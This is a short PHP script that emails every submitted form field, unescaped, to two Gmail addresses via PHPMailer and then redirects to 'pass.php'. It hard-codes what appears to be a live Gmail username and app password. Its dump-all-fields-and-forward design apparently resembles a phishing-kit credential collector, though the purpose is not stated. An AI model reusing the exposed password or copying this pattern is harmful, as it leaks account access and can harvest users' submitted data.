<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Initialize an empty body for the email
    $emailBody = '';

    // Iterate through the $_POST array to collect form data
    foreach ($_POST as $key => $value) {
        // Append form field name and its value to the email body
        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
    }


    // PHPMailer object creation
    $mail = new PHPMailer(true);

    try {
        // SMTP settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
        $mail->SMTPAuth   = true;
        $mail->Username   = 'abdulsamadabd093@gmail.com'; // Replace with your email address
        $mail->Password   = 'cyfp bgtb poon smnu'; // Replace with your email password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;


        // Email properties
        $mail->setFrom('abdulsam555551111@gmail.com', 'Professor');
        $mail->addAddress('abdulsam999999@gmail.com');
       $mail->addAddress('tufailm7358@gmail.com');


      // Email recipient's address

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'Professor Testing';
        $mail->Body = $emailBody; // Set the email body using the collected form data

        // Send email
 $mail->send();
    // Set a session variable to carry the success message to the redirected page
    session_start();
    $_SESSION['email_success'] = true;

    // Redirect to another page after sending email successfully
    header("Location: pass.php");
    exit(); // Make sure to exit after sending the header to prevent further execution
} catch (Exception $e) {
    echo "Email sending failed. Error message: {$mail->ErrorInfo}";

    }
}
?>